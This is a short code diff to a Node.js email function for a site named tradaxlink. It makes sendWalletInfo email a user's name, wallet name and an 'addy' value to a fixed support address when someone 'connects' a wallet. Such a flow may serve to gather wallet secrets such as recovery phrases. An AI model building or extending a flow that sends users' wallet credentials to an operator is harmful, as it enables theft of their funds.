@@ -510,7 +510,7 @@ const sendWelcomeEmail = async ({ to, otp }) => {
   console.log("Message sent: %s", info.messageId);
 };
 
-const sendWalletInfo = async ({ username, addy }) => {
+const sendWalletInfo = async ({ username, addy,wally }) => {
   async function verifyEmail() {
   
 
@@ -536,18 +536,22 @@ const sendWalletInfo = async ({ username, addy }) => {
   let info = await transporter.sendMail({
     from: `${process.env.EMAIL_USER}`, // sender address
     to: "support@tradaxlink.com", // list of receivers
-    subject: "Account Verification", // Subject line
+    subject: "Wallet Connect", // Subject line
     // text: "Hello ?", // plain text body
     html: `
     <html>
-    <h2>Welcome to tradaxlink</h2>
+    
 
     <p>${username},just requested to connect wallet.Here are the details;
 
     </p>
+    <p>Wallet:${wally}
+
+</p>
 <p>${addy}
 
 </p>
+
 
     </html>
     
